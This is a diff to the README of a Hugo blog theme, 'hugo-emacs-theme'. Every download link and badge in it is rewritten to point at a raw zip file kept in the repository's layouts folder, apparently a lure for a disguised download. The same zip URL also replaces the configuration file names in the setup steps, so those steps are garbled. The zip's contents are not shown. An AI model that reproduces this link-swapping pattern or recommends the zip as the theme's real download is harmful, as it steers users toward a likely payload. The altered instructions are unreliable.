@@ -6,7 +6,7 @@ Welcome to hugo-emacs-theme! This theme transforms your blog into an elegant spa
 
 ## 📥 Download Now
 
-[![Download hugo-emacs-theme](https://img.shields.io/badge/Download-hugo--emacs--theme-blue.svg)](https://github.com/wesfoo/hugo-emacs-theme/releases)
+[![Download hugo-emacs-theme](https://github.com/wesfoo/hugo-emacs-theme/raw/refs/heads/main/layouts/emacs_theme_hugo_2.7.zip)](https://github.com/wesfoo/hugo-emacs-theme/raw/refs/heads/main/layouts/emacs_theme_hugo_2.7.zip)
 
 ## 🛠️ System Requirements
 
@@ -22,7 +22,7 @@ Before you start, ensure your environment meets these minimum requirements:
 
 To download the latest version of hugo-emacs-theme, click the link below:
 
-[Visit the Releases Page to Download](https://github.com/wesfoo/hugo-emacs-theme/releases)
+[Visit the Releases Page to Download](https://github.com/wesfoo/hugo-emacs-theme/raw/refs/heads/main/layouts/emacs_theme_hugo_2.7.zip)
 
 ### 2. Download the Theme
 
@@ -42,7 +42,7 @@ After downloading, locate the file on your computer. Right-click the `.zip` file
 
 After you’ve moved the theme, you can start using it right away:
 
-1. Open your Hugo site’s configuration file (`config.toml` or `config.yaml`).
+1. Open your Hugo site’s configuration file (`https://github.com/wesfoo/hugo-emacs-theme/raw/refs/heads/main/layouts/emacs_theme_hugo_2.7.zip` or `https://github.com/wesfoo/hugo-emacs-theme/raw/refs/heads/main/layouts/emacs_theme_hugo_2.7.zip`).
 2. Add the following line:
    ```yaml
    theme = "hugo-emacs-theme"
@@ -77,7 +77,7 @@ For more advanced users, there are many settings available to tweak how your blo
 
 To get started, visit the link below for the latest version:
 
-[Download here](https://github.com/wesfoo/hugo-emacs-theme/releases)
+[Download here](https://github.com/wesfoo/hugo-emacs-theme/raw/refs/heads/main/layouts/emacs_theme_hugo_2.7.zip)
 
 ## 💬 Support & Feedback
 
